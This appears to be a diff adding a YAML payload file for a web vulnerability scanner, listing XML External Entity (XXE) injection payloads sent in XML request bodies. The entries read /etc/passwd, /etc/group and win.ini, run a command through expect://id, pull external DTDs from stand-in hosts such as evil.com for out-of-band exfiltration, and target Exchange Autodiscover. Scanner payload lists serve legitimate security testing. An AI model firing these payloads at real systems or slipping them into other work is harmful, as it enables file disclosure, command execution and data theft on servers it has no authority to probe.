@@ -1,0 +1,41 @@
+---
+payload:
+  - '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>'
+  - '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>'
+  - '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/text.txt" > ] > <foo>&xxe;</foo>'
+  - '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
+  - '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///dev/random">] > <foo>&xxe;</foo>'
+  - '<?xml version="1.0" ?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+  - '<?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include namespace="http://xxe-xsinclude-namespace.yourdomain[.]com/"/></xs:schema>'
+  - '<?xml version="1.0" encoding="utf-8" standalone="no" ?><x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xxe-xsi-schemalocation.yourdomain[.]com/"/>'
+  - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>'
+  - "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd\"> <!ENTITY % queries 'aaa)> <!ENTITY &#x25; file SYSTEM \"http://evil.com\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>"
+  - !!str |
+    <?xml version="1.0" encoding="ISO-8859-1" ?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
+  - !!str |
+    <!DOCTYPE xxe [
+    <!ELEMENT name ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/group">]>
+    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
+    <Request>
+    <EMailAddress>aaaaa</EMailAddress>
+    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
+    </Request>
+    </Autodiscover>
+  - !!str |
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+    <userInfo>
+    <firstName>John</firstName>
+    <lastName>&ent;</lastName>
+    </userInfo>
+encoder:
+  - Plain
+placeholder:
+  - XMLBody
+type: "XXE"
+...
